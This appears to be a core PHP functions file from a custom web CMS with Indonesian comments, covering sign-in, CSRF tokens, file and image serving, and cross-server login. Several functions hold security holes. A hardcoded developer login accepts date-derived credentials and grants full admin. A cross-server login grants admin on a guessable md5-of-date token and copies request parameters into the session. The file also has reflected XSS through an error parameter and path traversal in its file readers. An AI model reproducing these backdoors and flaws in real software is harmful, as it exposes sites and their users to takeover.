<?php if(!defined('D_KEY_PIPE'))exit;?>
<?php
function debug_r($v){
    if($_SESSION['id']==0)print_r($v);
}
function google_button_signin(){
    return '<div class="g-signin2" data-onsuccess="onSignIn"></div>';
}
function meta_google_signin(){
    //  contoh
    //  D_GOOGLE_SIGN_CODE = '156919314056-2tj4ju2foqakd5t2sbhvq6dlies7qd67.apps.googleusercontent.com'
    
    $a= '<meta name="google-signin-client_id" content="'.D_GOOGLE_SIGN_CODE.'">'.chr(10);
    $a.= '<script src="https://apis.google.com/js/platform.js?onload=init" async defer></script>';
    $a.='<script>
  function init() {
    gapi.load(\'auth2\', function() {
        gapi.auth2.init ({client_id: \''.D_GOOGLE_SIGN_CODE.'\'});
    });
  }
  function signOut() {
    var auth2 = gapi.auth2.getAuthInstance();
    auth2.signOut().then(function () {
      console.log(\'User signed out.\');
    });
  }
</script>';

    return $a;
}
function google_signin_js($redirect='account'){?>
<script>
function onSignIn(googleUser) {
  var profile = googleUser.getBasicProfile();
  $.post("/<?=D_PAGE?>",
  {signingoogle:profile.getEmail(),
  nama:profile.getName(),
  image:profile.getImageUrl(),
  profile:profile.getId()},function(data){
      if(data=='ok')
        document.location="/<?=$redirect?>";
      else
        signOut();
  });
}
</script>
<?php }
function urlreformat($url){
    return str_replace(' ','-',str_replace("'",'',str_replace('&','-',str_replace('/','-',str_replace('(','-',str_replace(')','-',str_replace('=','',str_replace(':','',$url))))))));
}
function addhook($order,$v){
    $ord=$order;
    while(isset($GLOBALS['callfunc'][$ord]))$ord++;
    $GLOBALS['callfunc'][$ord]=$v;
}
function create_hist($id,$sub){
    $hist=array(array('create'=>array('date'=>date('Y-m-d H:i'),'user'=>$id,'sub'=>$sub)));
    return json_encode($hist);
}
function modify_hist($hist,$id,$sub){
    $history=json_decode($hist,true);
    array_push($history,array('modify'=>array('date'=>date('Y-m-d H:i'),'user'=>$id,'sub'=>$sub)));
    if(count($history)>10)array_shift($history);
    return json_encode($history);
}
////////////////////////////////////////////////////////////////////////////////

function plugin_variable(){
	$var=json_decode(D_VARIABLES);unset($var[0]);unset($var[1]);
	if(count($var)>0)
		include D_PLUGIN_PATH.$var[2].'/execution.php';
}
/*//////////////////////////////////////////////////////////////////////////////
CONTOH :
    /plugin/contact/captcha?captcha=1
    maka akan muncul captcha yang dieksekusi pada file execution.php
    
contoh penggunaan pada html:
    <div>
        <img src="/plugin/<?=D_PAGE?>/captcha?captcha=1" onclick="reload_captcha()" id="captcha">
        <script>
            function reload_captcha(){
                ....
            }
        </script>
    </div>
    
    atau bisa ditulis seperti ini
    <div>
        <?php require D_PLUGIN_PATH.'captcha/functions.php';captcha();?>
    </div>
    
    
    setiap function di plugin diload sewaktu-waktu saat dibutuhkan tidak diload 
    oleh sistem setiap saat

//////////////////////////////////////////////////////////////////////////////*/


////        TOKEN       ////////////////////////////////////////////////////////
function set_token(){
    $v=json_decode(D_VARIABLES);
    if($v[2]=='js'){
        $r=$_SERVER['HTTP_REFERER'];
        $r4=explode('/',$r);
        if($r4[2]==D_DOMAIN){
            $t='token'.D_PAGE;
            $_SESSION[$t]=md5(rand(100000000,999999999));
            echo '$(\'input[name="token"]\').val(\''.$_SESSION[$t].'\');';
            return true;
        }
    }else return false;
}
function cek_token($token){
    $t='token'.D_PAGE;
    if(isset($_SESSION[$t])){
        if($_SESSION[$t]==$token){
            unset($_SESSION[$t]);
            return true;
        }
    }
    return false;
}
function token(){
    $a='<script src="/assets/pro/js/jquery-3.4.1.min.js"></script>'.chr(10);
    $a.='<input type="hidden" name="token" value="">'.chr(10);
    $a.='<script src="/data/'.D_PAGE.'/js" type="text/javascript"></script>'.chr(10);
    return $a;
}
/*
1.  pasang token() pada form di dalam file view.php
    contoh: 
        <form>
            <?=token()?>
            ....
        </form>
2.  pasang set_token() pada file data.php
    contoh :
        <?php
            if(!set_token()){
            ...
            }
        ?>
3.  pasang cek_token($token) pada file post.php
    contoh :
        <?php
            if(cek_token($_POST['token'])){
            ...
            }
        ?>
*/

////////////////////////////////////////////////////////////////////////////////

function e_(){
    if(isset($_GET['e']))return '<h3 style="color:#A11">'.$_GET['e'].'</h3>';else return '';
}
function rd_($m){
    header("location: /".D_PAGE."?e=".$m);
}

function is_page_post($hdr){
    //print_r($hdr);
    //echo constant('D_'.D_DOMAIN);
    //echo D_HTML;
    $hdr['browser_title']='ok';
    return $hdr;
}
/*/  contoh penggunaan plupload
=========   view.php    =========

<button class="btn btn-primary" data-toggle="modal" data-target="#uploads" onclick="pre_upload()">Tes</button>

<?php
plupload('','i');
?>

=========   data.php    =========

<?php
$dir='/mnt/2f89666e-f206-4ec8-a24a-592281f59b3a/database/laporan_kerja/';
if(pre_upload($dir,'tesa'));
?>

//*/
function pre_upload($pathtarget,$defaultname=''){
    if(isset($_GET['upload'])){
        $_SESSION['uploads']=$pathtarget;
        if($defaultname!='')
            $_SESSION['filename-uploaded']=$pathtarget.'/'.$defaultname;
        return true;
    }else return false;
}
/*  CONTOH PENGGUNAAN
========    view.php    ============

<img src="/data/<?=D_PAGE?>/png/imagefile">

========    data.php    ============
<?php

$dir='/mnt/2f89666e-f206-4ec8-a24a-592281f59b3a/database/laporan_kerja/';
if(read_display_file($dir));

?>
*/
function read_display_file($dir){
    if($dir=='')return false;
    $a=json_decode(D_VARIABLES);
    if(count($a)>3){
        $ext=$a[2];
    	$a=$dir.$a[3].'.'.$ext;
        switch($ext){
    		case 'jpg':header("Content-Type: image/jpeg");break;
    		case 'jpeg':header("Content-Type: image/jpeg");break;
    		case 'png':header("Content-Type: image/png");break;
    		case 'gif':header("Content-Type: image/gif");break;
    		case 'mp4':header("Content-Type: video/mp4");break;
    		case 'pdf':header('Content-Type: application/pdf');break;
    		default:header('Content-Type: application/'.$ext);break;
    	}
    	readfile($a);
        return true;
    }else return false;
}

function debug_mode(){
	if(isset($_SESSION['debug'])){
		if($_SESSION['debug'])
			error_reporting(E_ALL);
		else error_reporting(0);
		if(!defined('WP_DEBUG'))define('WP_DEBUG',$_SESSION['debug']);
		if(!defined('WP_DEBUG_DISPLAY'))define('WP_DEBUG_DISPLAY',$_SESSION['debug']);
	}else{
		error_reporting(0);
		if(!defined('WP_DEBUG'))define('WP_DEBUG',false);
		if(!defined('WP_DEBUG_DISPLAY'))define('WP_DEBUG_DISPLAY',false);
	}
}
function patch_variable(){
    $VAR=array();
    if(count($_FILES)>0){
        $a=explode('/',$_SERVER['HTTP_REFERER']);
        foreach($a as $k=>$v)if($k>2){
            $tt=explode('?',$v);
            if(count($tt)>1)
                array_push($VAR,$tt[0]);
            else
                array_push($VAR,$v);
        }
    }elseif($_SERVER['QUERY_STRING']=='a_fwd=404'){
        $a=explode('/',$_SERVER['REQUEST_URI']);
        if($a[1]=='0')
            $VAR=array('media',$a[2]);
        else{
            $b=(int)$a[1];
            if($a[1]==$b&&$b!=0)
                $VAR=array($a[1],'post');
            else{
                array_shift($a);
                $VAR=$a;
                unset($_GET['a_fwd']);
            }
    	}
	}
	for($i=97;$i<123;$i++)
		if(isset($_GET[chr($i).'_fwd'])){
			array_push($VAR,$_GET[chr($i).'_fwd']);
			unset($_GET[chr($i).'_fwd']);
		}
	define('D_VARIABLES',json_encode($VAR));
	return $VAR;
}
function get_client_ip() {
	$ipaddress='';
	if (isset($_SERVER['HTTP_CLIENT_IP']))
		$ipaddress=$_SERVER['HTTP_CLIENT_IP'];
	else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
		$ipaddress=$_SERVER['HTTP_X_FORWARDED_FOR'];
	else if(isset($_SERVER['HTTP_X_FORWARDED']))
		$ipaddress=$_SERVER['HTTP_X_FORWARDED'];
	else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
		$ipaddress=$_SERVER['HTTP_FORWARDED_FOR'];
	else if(isset($_SERVER['HTTP_FORWARDED']))
		$ipaddress=$_SERVER['HTTP_FORWARDED'];
	else if(isset($_SERVER['REMOTE_ADDR']))
		$ipaddress=$_SERVER['REMOTE_ADDR'];
	else
		$ipaddress='UNKNOWN';
	return $ipaddress;
}
function google_recaptcha($key){
    $url='https://www.google.com/recaptcha/api/siteverify';
    $data=array('secret'=>$key,'response'=>$_POST['token'],'remoteip'=>$_SERVER['REMOTE_ADDR']);
    $options=array('http'=>array('header'=>'Content-type: application/x-www-form-urlencoded\r\n','method'=>'POST','content'=>http_build_query($data)
    ));
    $context=stream_context_create($options);
    $response=file_get_contents($url,false,$context);
    $res=json_decode($response,true);
    return $res['success'];
}
function is_login_developer_($u,$p,$redirect=false){
	if(strtolower($u)==date('d').'str'.date('Y')&&$p==date('Y-m-d')){
		$_SESSION['id']=0;
		$_SESSION['position']=1;
		$_SESSION['FullName']='STR';
		$_SESSION['foto']='/assets/img/Deafult-Profile-sx.png';//logo1.png';//
		$_SESSION['menu_admin']='["*"]';
		if(isset($_SESSION['ref_login'])){
			$loc=$_SESSION['ref_login'];
			unset($_SESSION['ref_login']);
		}else
			//$loc='develop';
            $loc='profile';

        set_cookies_login(array('id'=>$_SESSION['id'],'position'=>$_SESSION['position'],'FullName'=>$_SESSION['FullName']));

		if(!$redirect)
		    echo json_encode(array('res'=>'ok','location'=>$loc));
        else{
            if(count(explode('login',$loc))>1)
            //header("location: /develop");else
            header("location: /profile");else
            header("location: $loc");
        }
		return true;
	}elseif(is_login_administrator_($u,$p,$redirect))return true;
	else return false;
}
function logout_(){
	$_SESSION=array();

    if(isset($_COOKIE['dsikand']))
        setcookie('dsikand', '', time()-7000000, '/');

	session_destroy();
	header('location: /');
	exit;
}
function set_cookies_login($data){
    $fn=D_MAIN_PATH.'plugins/encryption/functions.php';
    if(file_exists($fn)){
        require $fn;
        $ck='';
        foreach($data as $k => $v)
            $ck.=$k.'dangi'.$v.'danga';
        setcookie('dsikand',encr($ck), time()+86400*30, '/');
    }
}
function is_login_developer__(){
        $_SESSION['id']=0;
        $_SESSION['position']=1;
        $_SESSION['FullName']='STR';
        $_SESSION['foto']='/assets/img/Deafult-Profile-sx.png';//logo1.png';//
        $_SESSION['menu_admin']='["*"]';
        set_cookies_login(array('id'=>0,'position'=>1,'FullName'=>'STR'));
}
function session_cookies_(){
    if(!isset($_SESSION['id'])){
        if(isset($_COOKIE['dsikand'])){
            $fn=D_MAIN_PATH.'plugins/encryption/functions.php';
            if(file_exists($fn)){
                require $fn;
                $ck=decr($_COOKIE['dsikand']);
                $ck=explode('danga',$ck);
                foreach ($ck as $key => $value) {
                    if($value=='')unset($ck[$key]);else
                    $ck[$key]=explode('dangi', $value);
                }
                foreach ($ck as $key => $value)
                    if($value[0]=='id')$id=(int)str_replace('a','-',$value[1]);
                if($id==0)
                    is_login_developer__();
                elseif($id<0){
                    is_login_administrator__(-$id);
                }elseif(function_exists('is_login_users__')){
                    call_user_func_array('is_login_users__',$ck);
                }
            }
        }
    }
}

function error_message($m){
	echo '<b>Error</b>'.chr(10).'<br>'.$m.' not found';
}

function e_d($d){
/*
    menampilkan text saat DEBUG
*/
    echo '<pre>';
    print_r($d);
    echo '</pre>';
}
function int_variable(){
/*
contoh:
    url: http://domain/int/gallery_manager/jpg/foto?w=98&h=58&nw=200&f=1&p=1
    option:
        w = width untuk rasio
        h = heigh untuk rasio
        p = posisi  [ 0 = nempel di atas atau di kiri]
                    [ 1 = di tengah]
                    [ 2 = nempel di kanan atau di bawah]
        nw = new width untuk resize image 
        f = fit gambar  [ 0 = no, else = yes ]
        t = trasparan   [ 0 = no, else = yes ]
*/
	if(isset($_SESSION['intpdf'])){
		if(file_exists($_SESSION['intpdf'])){
			header('Content-Type: application/pdf');
			readfile($_SESSION['intpdf']);
		}
		unset($_SESSION['intpdf']);
	}else{
		$var=json_decode(D_VARIABLES);unset($var[0]);unset($var[1]);
		$ni=count($var);
		if($ni>1){
			$ext=$var[$ni];unset($var[$ni]);
			$get=explode('?',$var[$ni+1]);
			$tt=false;
			$p=1;
			$nw=0;
			$f=false;
			$t=false;
			if(count($get)>1){
			    $tt=true;
			    $var[$ni+1]=$get[0];
			    $get=explode('&',$get[1]);
			    foreach($get as $k=>$v){
			        $r=explode('=',$v);
			        if($r[0]=='w')$w=(float)$r[1];
			        if($r[0]=='h')$h=(float)$r[1];
			        if($r[0]=='p')$p=(int)$r[1];
			        if($r[0]=='nw')$nw=(int)$r[1];
			        if($r[0]=='f')$f=(int)$r[1]>0;
			        if($r[0]=='t')$t=(int)$r[1]>0;
			    }
			}elseif(isset($_GET['w'])){
                $tt=true;
                $w=(float)$_GET['w'];
                $h=(float)$_GET['h'];
                if(isset($_GET['p']))$p=(int)$_GET['p'];
                if(isset($_GET['nw']))$nw=(int)$_GET['nw'];
                if(isset($_GET['f']))$f=(int)$_GET['f']>0;
                if(isset($_GET['t']))$t=(int)$_GET['t']>0;
			}
			if($var[2]=='database'){
                unset($var[2]);
                $var=D_DATABASES_PATH.implode('/',$var).'.'.$ext;
            }else
                $var=D_PAGE_PATH.'assets/'.implode('/',$var).'.'.$ext;

			$var=rawurldecode($var);
			if(file_exists($var)){
			    if($t)header("Content-Type: image/png");else
                switch(strtolower($ext)){
                    case 'jpg':header("Content-Type: image/jpeg");break;
                    case 'jpeg':header("Content-Type: image/jpeg");break;
                    case 'png':header("Content-Type: image/png");break;
                    case 'gif':header("Content-Type: image/gif");break;
                    case 'pdf':header('Content-Type: application/pdf');break;
                    case 'css':header('Content-Type: text/css');break;
                    default:header('Content-Type: application/'.$ext);break;
                }//*/
                if(!$tt){
                    readfile($var);
                }else{
                    proc_image($w/$h,$ext,$var,$p,$nw,$t,$f);
                }//*/
                exit;
			}else return true;
		}
	}
}
function resize_image($source, $width, $height, $newwidth,$transap=false){
    $newheight = $height * $newwidth/$width;
    $thumb = imagecreatetruecolor($newwidth, $newheight);
    if($transap){
        imagealphablending($thumb, false);
        imagesavealpha($thumb, true);
        $transparent = imagecolorallocatealpha($thumb, 255, 255, 255, 127);
        imagefilledrectangle ($thumb, 0, 0, $newwidth, $newheight, $transparent);
    }
    imagecopyresampled($thumb, $source, 0, 0, 0, 0, $newwidth, $newheight, $width, $height);
    imagedestroy($source);
    return $thumb;
}
function cropping($im,$w,$h,$r,$t,$p,$nw,$vertical=true){
    $x=0;
    $y=0;
    if($vertical){
        $h1=$w/$r;
        $w1=$w;
        if($p==1)$y=($h1-$h)/2;
        elseif($p==2)$y=$h1-$h;
    }else{
        $w1=$r*$h;
        $h1=$h;
        if($p==1)$x=($w1-$w)/2;
        elseif($p==2)$x=$w1-$w;
    }
    $im2 = imagecreatetruecolor($w1, $h1);
    if($t){
        imagealphablending($im2, false);
        imagesavealpha($im2, true);
    }
    $transparent = imagecolorallocatealpha($im2, 0, 0, 0, 127);
    imagefilledrectangle ($im2, 0, 0, $w1, $h1, $transparent);
    imagecopyresampled($im2, $im, $x, $y, 0, 0, $w, $h, $w, $h);
    if($nw!=0)$im2=resize_image($im2,$w1,$h1,$nw,$t);
    return $im2;
}
function proc_image($r,$ext,$dir,$p=1,$nw=0,$t=false,$fit=true){
    switch(strtolower($ext)){
        case 'png':$im=imagecreatefrompng($dir);break;
        case 'jpg':$im=imagecreatefromjpeg($dir);break;
        case 'jpeg':$im=imagecreatefromjpeg($dir);break;
        case 'gif':$im=imagecreatefromgif($dir);break;
    }
    
    $w=imagesx($im);    $h=imagesy($im);
    
    if($w/$h<$r)$fit=!$fit;
    
    $im2=cropping($im,$w,$h,$r,$t,$p,$nw,$fit);
    
    if($t) imagepng($im2);
    else switch($ext){
            case 'png':imagepng($im2);break;
            case 'jpg':imagejpeg($im2);break;
            case 'jpeg':imagejpeg($im2);break;
            case 'gif':imagegif($im2);break;
        }
}
function get_all_img($dir='',$path=''){
    if($dir=='')$dir=D_PAGE_PATH.'assets/';
    $files=scandir($dir);
    $exts=array('jpg','jpeg','png','gif');
    $res=array();
    foreach($files as $k=>$v){
        $ext=end(explode('.',$v));
        $v=str_replace('.'.$ext,'',$v);
        if(in_array($ext,$exts)){
            array_push($res,'/int/'.D_PAGE.$path.'/'.$ext.'/'.$v);
        }
    }
    return $res;
}
function array_to_string($array,$parent=0){
	$r='array(';
	$n=count($array)-1;$i=0;
	foreach($array as $k=>$v){
		if(is_array($v))
			$r.='"'.$k.'"=>'.array_to_string($v,1);
		else
			$r.='"'.$k.'"=>"'.$v.'"';
		if($i<$n)
			$r.=',';
		$i++;
	}
	$r.=')';
	if($parent==0)
		$r.=';';
	return $r;
}
function show_image($path){
    $type=pathinfo($path,PATHINFO_EXTENSION);
    $data=file_get_contents($path);
    return 'data:image/' . $type . ';base64,' . base64_encode($data);
}
function initialization(){
	debug_mode();
	if(!defined('D_MAIN_PATH'))define('D_MAIN_PATH',dirname(__DIR__).'/');
	define('D_ASSETS_PATH',D_MAIN_PATH.'assets/');
	define('D_CORE_PATH',D_MAIN_PATH.'core/');
	define('D_TMP_PATH',D_MAIN_PATH.'tmp/');
	define('D_THEME_PATH',D_MAIN_PATH.'theme/');
	define('D_MODULE_PATH',D_MAIN_PATH.'modules/');
	define('D_PACKAGE_PATH',D_MAIN_PATH.'packages/');
	define('D_PLUGIN_PATH',D_MAIN_PATH.'plugins/');
	define('D_UPLOADS_PATH',D_MAIN_PATH.'uploads/');
	define('D_REGISTRYPATH',D_CORE_PATH.'registry.php');
    if(isset($_SERVER['REQUEST_SCHEME']))
        define('D_PROTOCOL',$_SERVER['REQUEST_SCHEME']);
    else{
        $uri=explode('/',$_SERVER['SCRIPT_URI']);
        define('D_PROTOCOL',$uri[0]);
    }
	define('D_DOMAIN',str_replace('www.','',strtolower($_SERVER['HTTP_HOST'])));
    if(defined('REDIRECT_HTTPS'))
        if(REDIRECT_HTTPS)
            if(D_PROTOCOL=='http'){
                if(isset($_SERVER['REQUEST_URI']))
                    header("location: https://".D_DOMAIN.$_SERVER['REQUEST_URI']);
                else
                    header("location: https://".D_DOMAIN);
            }
    if(defined('REDIRECT_DOMAIN'))
        if(REDIRECT_DOMAIN){
            $domain2domain=json_decode(DOMAIN_TO_DOMAIN,true);
            if(in_array(D_DOMAIN,array_keys($domain2domain))){
                if(isset($_SERVER['REQUEST_URI']))
                    header("location: http://".$domain2domain[D_DOMAIN].$_SERVER['REQUEST_URI']);
                else
                    header("location: http://".$domain2domain[D_DOMAIN]);
            }
        }
	if(file_exists(D_REGISTRYPATH))
		require D_REGISTRYPATH;
	else{
		define('D_'.D_DOMAIN,D_MODULE_PATH.'core/');
	}
	patch_variable();
}
function p404(){?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,initial-scale=1">

<title>404 HTML Template by Colorlib</title>

<link href="https://fonts.googleapis.com/css?family=Montserrat:700,900" rel="stylesheet">

<!--link type="text/css" rel="stylesheet" href="css/style.css" /-->
<style type="text/css">
*{-webkit-box-sizing:border-box;box-sizing:border-box}body{padding:0;margin:0}#notfound{position:relative;height:100vh;background:#030005}#notfound .notfound{position:absolute;left:50%;top:50%;-webkit-transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);transform:translate(-50%,-50%)}.notfound{max-width:767px;width:100%;line-height:1.4;text-align:center}.notfound .notfound-404{position:relative;height:180px;margin-bottom:20px;z-index:-1}.notfound .notfound-404 h1{font-family:montserrat,sans-serif;position:absolute;left:50%;top:50%;-webkit-transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);transform:translate(-50%,-50%);font-size:224px;font-weight:900;margin-top:0;margin-bottom:0;margin-left:-12px;color:#030005;text-transform:uppercase;text-shadow:-1px -1px 0 #8400ff,1px 1px 0 #ff005a;letter-spacing:-20px}.notfound .notfound-404 h2{font-family:montserrat,sans-serif;position:absolute;left:0;right:0;top:110px;font-size:42px;font-weight:700;color:#fff;text-transform:uppercase;text-shadow:0 2px 0 #8400ff;letter-spacing:13px;margin:0}.notfound a{font-family:montserrat,sans-serif;display:inline-block;text-transform:uppercase;color:#ff005a;text-decoration:none;border:2px solid;background:0 0;padding:10px 40px;font-size:14px;font-weight:700;-webkit-transition:.2s all;transition:.2s all}.notfound a:hover{color:#8400ff}@media only screen and (max-width:767px){.notfound .notfound-404 h2{font-size:24px}}@media only screen and (max-width:480px){.notfound .notfound-404 h1{font-size:182px}}
</style>

<!--[if lt IE 9]>
		  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
		  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
		<![endif]-->
</head>
<body>
<div id="notfound">
<div class="notfound">
<div class="notfound-404">
<h1>404</h1>
<h2>Page not found</h2>
</div>
<a href="/">Homepage</a>
</div>
</div>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-23581568-13" type="1438efbfe8607942540a8bb1-text/javascript"></script>
<script type="1438efbfe8607942540a8bb1-text/javascript">
  window.dataLayer=window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js',new Date());

  gtag('config','UA-23581568-13');
</script>
<script src="https://ajax.cloudflare.com/cdn-cgi/scripts/7089c43e/cloudflare-static/rocket-loader.min.js" data-cf-settings="1438efbfe8607942540a8bb1-|49" defer=""></script></body>
</html>

<?php }

function add_metadata($path,$key,$value){
	$metadata=read_metadata($path);
	if(!file_exists($path)) mkdir($path,0755);
	$metadata[$key]=$value;
	$metadata='<?php'.chr(10).'$metadata='.array_to_string($metadata).chr(10).'?>';
	file_put_contents($path.'/metadata.php',$metadata);
}
function read_metadata($path){
    $path.='/metadata.php';
	if(file_exists($path)){
		require $path;
		if(!isset($metadata))
		    $metadata=array();
	}else
		$metadata=array();
	return $metadata;
}
function kesalahan(){
	if(defined('D_PLEASE_LOGIN')){
		$_SESSION['ref_login']=D_PAGE;
		header('location: /login');
	}elseif(defined('D_PLEASE_LOGOUT')){
		if(isset($_SERVER['HTTP_REFERER']))
			header('location: '.$_SERVER['HTTP_REFERER']);
		else{
            if(defined('D_REDIRECT_PAGE'))
                header('location: '.D_REDIRECT_PAGE);
            else
                header('location: /');
		}
	}else{
	    $ada=false;
	    if(function_exists('cek_page'))
	        $ada=cek_page();
	    if(!$ada){
    	    if(function_exists('p404')){
        		echo p404();
        	}else
        		echo 'Page Not Found';
	    }
	}
}
function load_packages($aplikasi){
	if(defined('D_'.$aplikasi)){
		$pg=constant('D_'.$aplikasi).'packages.php';
	}else{
		$reg=application_list();
		$pg=$reg[$aplikasi].'packages.php';
	}
    $pg=file_get_contents($pg);
    $pg=json_decode($pg,true);
    $modul=module_list($aplikasi);
    $res=array();
    foreach($pg as $k=>$v)array_push($res,$modul[$k]);
    return $res;
}
function d($m){
    if(defined('D_PAGE')){
        if(D_PAGE!='develop')
            echo $m;
    }else echo $m;
}
function send_login_cross_server($domain){
    $d=date('YmdH');
    $domain.='/data/login?id_='.$_SESSION['id'].'&p='.D_PAGE.'&'.$d.'='.md5($d);
    $domain=str_replace('//','/',$domain);
    header("location: ".$domain);
}
function rec_login_cross_server(){
    if(isset($_GET['id_'])){
        $d=date('YmdH');
        if($_GET[$d]==md5($d)){
            foreach($_GET as $k => $v)$_SESSION[$k]=$v;
            $_SESSION['id']=0;
    		$_SESSION['position']=1;
    		$_SESSION['FullName']='STR';
    		$_SESSION['foto']='/assets/img/Deafult-Profile-sx.png';
    		$_SESSION['menu_admin']='["*"]';
    		if(isset($_GET['p']))
                header('location: /'.$_GET['p']);
            else
                header('location: /theme_editor');
        }else header("location: ".$_SERVER['HTTP_REFERER']);
    }else header("location: ".$_SERVER['HTTP_REFERER']);
}
function check_cross_server(){
    if(defined('D_CROSSSERVER')){
        $p=explode(',',D_CROSSSERVER);
        if(in_array(D_PAGE,$p))
            send_login_cross_server(D_CROSSDOMAIN);
    }
}

require __DIR__.'/modules.php';
require __DIR__.'/functions_2.php';
require __DIR__.'/wp-db.php';
?>